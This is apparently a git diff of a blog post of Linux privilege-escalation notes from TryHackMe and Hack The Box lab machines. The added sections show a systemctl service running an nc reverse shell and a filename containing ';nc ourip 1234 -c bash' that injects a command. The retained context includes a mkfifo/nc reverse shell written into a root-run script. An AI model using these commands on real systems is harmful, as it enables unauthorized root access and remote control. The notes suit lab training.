@@ -10,6 +10,7 @@ math: true
 
 # SUID binaries for privilege escalation:
 
+
 ## tryhackme linux priv esc arena:
 
 
@@ -122,6 +123,42 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash &&
 bash-4.1# whoami
 root
 ```
+
+## exploiting systemctl to gain a root shell - hack the box jarvis:
+```bash
+pepper@jarvis:~$ find / -perm -4000 2> /dev/null
+
+/bin/systemctl
+```
+Here we can see that our find command has picked up the binary `systemctl`. we check permissions for it by doing `ls -la file` and it is running as root.
+
+The genral idea of systemctl is that it turns linux services on and off. What we have to do is create a new service and start it. As it will be running as root the service is started as root.
+```bash
+pepper@jarvis:~$ echo '[Service]' > fieldraccoon.service
+pepper@jarvis:~$ echo 'Type=oneshot' >> fieldraccoon.service
+pepper@jarvis:~$ echo 'ExecStart=/bin/nc -e /bin/bash 10.10.xx.xx 1234' >> fieldraccoon.service
+pepper@jarvis:~$ echo '[Install]' >> fieldraccoon.service
+pepper@jarvis:~$ echo 'WantedBy=multi-user.target' >> fieldraccoon.service
+```
+We make our service file by using some help on GTFObins And on the service section we execute a reverse shell which will point to a listener and gain us the shell.
+
+```bash
+pepper@jarvis:~$ systemctl enable /home/pepper/fieldraccoon.service
+```
+On our listener:
+```bash
+nc -lvnp 1234
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.xx.xx
+Ncat: Connection from 10.10.xx.xx:xxxx.
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+d41d8cd[redacted]
+```
+
 
 ## tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
 
@@ -239,7 +276,6 @@ We check privelages for the copy.sh file and it turns out that we can write to i
 We add a reverse shell to the file and execute it as root and we get a shell.
 
 ```bash
-
 www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
 < -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
 www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
@@ -259,11 +295,12 @@ uid=0(root) gid=0(root) groups=0(root)
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
 
-# Other
+## Other
 
 ## Priv esc with mounting file system on docker:
 
 Running `id` confirms that the user is part of a docker group, we will see if we can exploit this.
+
 ```bash
 spanishdancer@ariekei:~$ id
 uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
@@ -623,7 +660,7 @@ This tells us that we can run `journalctl` as root.
 
 We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
 ```bash
-david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 -- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
 Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
 Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
@@ -631,7 +668,7 @@ Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identi
 Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
 Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
 !/bin/bash
-root@traverxec:/home/david
+root@traverxec:/home/david#
 ```
 After the script has executed we type `!/bin/bash` which will give us a shell.
 
@@ -666,6 +703,17 @@ root@debian:/home/user# id && whoami
 uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 root
 ```
+## Using touch to make an executable file name - hack the box networed:
+
+After gaining a shell we find a file which involves this interesting line:
+```bash
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+```
+we can see that the variable holds the name of a file and if we name it in a specific way we can try and execute code with it.
+```bash
+touch ";nc ourip 1234 -c bash"
+```
+And then if we setup a listener on port 1234 with `nc -nlvp 1234` we get a connection back on our listener.
 
 
 Thanks for reading hope that you enjoyed.
